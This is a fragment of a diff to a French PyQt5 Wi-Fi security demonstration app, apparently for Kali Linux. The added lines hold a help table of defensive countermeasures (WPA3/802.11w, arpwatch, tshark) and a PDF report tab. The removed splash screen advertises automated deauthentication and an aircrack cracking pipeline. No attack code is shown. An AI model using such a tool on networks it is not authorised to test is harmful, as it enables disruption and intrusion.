+<tr><td>WPA3 + 802.11w</td><td><span class="code">hostapd (ieee80211w=2)</span></td><td class="ok">Deauth bloqué</td></tr>
+<tr><td>Mot de passe fort</td><td>Politique interne</td><td class="ok">Crack impossible</td></tr>
+<tr><td>arpwatch</td><td><span class="code">arpwatch -i wlan0</span></td><td class="ok">MiM détecté</td></tr>
+<tr><td>tshark / Wireshark</td><td><span class="code">tshark -i wlan0</span></td><td class="ok">Trafic analysé</td></tr>
+</table>
+
+<h2>Onglet Bilan & PDF</h2>
+<p>Génère un rapport PDF complet avec :
+architecture, attaques, contre-mesures, comparaison protocoles (WEP/WPA/WPA2/WPA3), conclusion.</p>
+<p>Fichier enregistré dans : <span class="code">~/CyberSec_Rapports/</span></p>
+""")
+        lay.addWidget(content, stretch=1)
+        QPushButton("Fermer").clicked  # placeholder
+        btn = QPushButton("Fermer")
+        btn.clicked.connect(dlg.close)
+        lay.addWidget(btn)
+        dlg.exec_()
+
+
 def main():
-    app=QApplication(sys.argv)
-    app.setApplicationName("WiFi Security Demo v4")
-
-    pix=QPixmap(400,160); pix.fill(QColor(BG))
-    p=QPainter(pix)
-    p.setPen(QColor(B1)); p.drawRect(0,0,399,159)
-    p.setPen(QColor(CYAN)); p.setFont(QFont("JetBrains Mono",17,QFont.Bold))
-    p.drawText(18,58,"🔐  WiFi Security Demo  v5.0")
-    p.setPen(QColor(DIM)); p.setFont(QFont("JetBrains Mono",10))
-    p.drawText(18,82,"PyQt5  ·  Kali Linux  ·  Terminal intégré")
-    p.drawText(18,102,"✔ AUTO capture.cap  ✔ Pipeline aircrack complet")
-    p.drawText(18,122,"✔ Deauth automatique  ✔ Handshake détection auto")
-    p.drawText(18,146,"Chargement…")
-    p.end()
-    splash=QSplashScreen(pix); splash.show(); app.processEvents()
-
-    dlg=Disclaimer(); splash.close()
-    if dlg.exec_()!=QDialog.Accepted: sys.exit(0)
-
-    win=MainWin(); win.show()
+    app = QApplication(sys.argv)
+    app.setStyle("Fusion")
+    win = MainWindow()
+    win.show()
     sys.exit(app.exec_())
 
-if __name__=="__main__":
+
+if __name__ == "__main__":
     main()
